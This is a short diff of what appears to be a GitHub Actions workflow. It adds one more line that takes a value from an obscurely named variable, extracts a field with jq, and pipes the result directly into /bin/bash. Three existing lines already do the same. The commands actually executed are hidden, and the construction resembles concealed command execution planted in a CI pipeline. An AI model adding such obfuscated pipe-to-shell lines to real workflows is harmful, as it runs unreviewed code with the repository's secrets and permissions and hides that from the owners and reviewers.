@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$w6" | jq -r .ncrgc010 | /bin/bash
           echo $hgwm552 | jq -r .eig958 | /bin/bash
           echo $he521 | jq -r .kmbgq3 | /bin/bash
+          echo $qjl0428 | jq -r .ma2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
